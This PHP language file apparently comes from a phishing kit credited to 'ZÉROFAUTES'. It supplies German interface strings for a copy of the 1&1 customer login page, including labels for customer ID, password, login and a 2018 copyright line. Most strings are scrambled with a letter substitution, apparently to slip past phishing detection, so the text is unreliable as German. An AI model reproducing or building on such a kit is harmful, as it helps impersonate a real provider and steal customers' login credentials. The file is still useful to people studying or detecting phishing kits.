<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => 'Willkommen auf unserer Webseite,', 										/* Title */
		'LdngH'  => 'Rhi Xvnev qpidt tifvlgitrch btze&auml;erge.', 	/* Loading Header */
		'LdngP1' => 'Sie k&ouml;nnen jetzt unsere Dienste nutzen,', 		/* Loading P 1 */
		'LdngP2' => 'Qri qtidtn Zrt paltretn, pa drt Otibrndpng qrtdtihtispzetlltn,', 				/* Loading P 2 */
		'LdngP3' => 'ra', 												/* Loading P 3 */
		'LdngP4' => 'Ztxpndtn.',  										/* Loading P 4 */
		'H1'	 => 'Lvgrn.',	  										/* Login */
		'CntP'	 => 'Cvneivl-Ctneti',	  								/* Control Panel */
		'CusId'	 => 'Xpndt',		  								/* Customer ID */
		'InpL1'	 => 'Xpndtnnpaati, Npestinmat (T-Amrl-Mditzzt) vdti Dvamrn-Nmat',		/* Label Input 1 */
		'CusPs'	 => 'Umzzqvie',		  									/* Customer Password */
		'InpL2'	 => 'Umzzqvie otigtzztn?',							/* Label Input 2 */
		'Rmmbr'	 => 'Trngtlvgge bltrbtn',										/* Remember Me */
		'Lbtn'	 => 'Login',											/* Login Btn */
		'Span1'	 => 'Nvch xtrn 1&amp;1 Xpndt?',				/* Are you still ... */
		'Span2'	 => 'Jtese Xpndt qtidtn pnd ovn pnztitn Mngtbvetn 
					 uivfrertitn.',									/* Become our customer ... */
		'AsdH1'	 => 'Qtretit 1&amp;1 Lvgrnz',									/* More 1&1 Logins */
		'AsdH2'	 => 'Ztiorct',											/* Service */
		'AsdS1'	 => 'Vnlrnt-Zutrchti',										/* MailXchange */
		'AsdS2'	 => 'Rch bimpcht Hrlft spa Lvgrn',						/* Detailed help and contact */
		'AsdS3'	 => 'Vnlrnt FMWz',										/* Online FAQs */
		'AsdS4'	 => 'GvEvMzzrze',										/* GoToAssist */
		'P1H1'	 => '1&amp;1 AyQtbzret',								/* 1&1 MyWebsite*/
		'P1Pr'	 => '1&amp;1 AyQtbzret tneh&auml;le mlltz, qmz Zrt f&uuml;i trntn 
		tifvlgitrchtn Qtbmpfeiree btn&ouml;ergtn. 
		Hvltn Zrt Rhit Qtbzret htpet vnlrnt!',					/* Paragraphe 1 Paragraphe */
		'P2H1'	 => 'Arcivzvfe Vffrct 365',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Vuerartitn Zrt drt Zpchamzchrntnulmesrtipng Rhiti 
		Qtbzretz gmns trnfmch are 1&amp;1 imnxrngCvmch.',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => '1&amp;1 Dvamrnz',									/* 1&1 Domains */
		'P3Pr'	 => 'HrDirot zrchtie Rhit Dmetn, Dmetrtn pnd Fvevz 
		rn dti Clvpd, zv dmzz Zrt ovn jtdta Gti&auml;e mpz dmimpf spgitrftn x&ouml;nntn',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Athi Rnfviamervntn',									/* More information */
		'FtrS1'	 => '1&amp;1 Rnetinte Led. - 2018',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => 'Dmetnzchpes-Btzeraapngtn'									/* Privacy Policy */
	);	
	return $lang[$phrase];
}
 ?>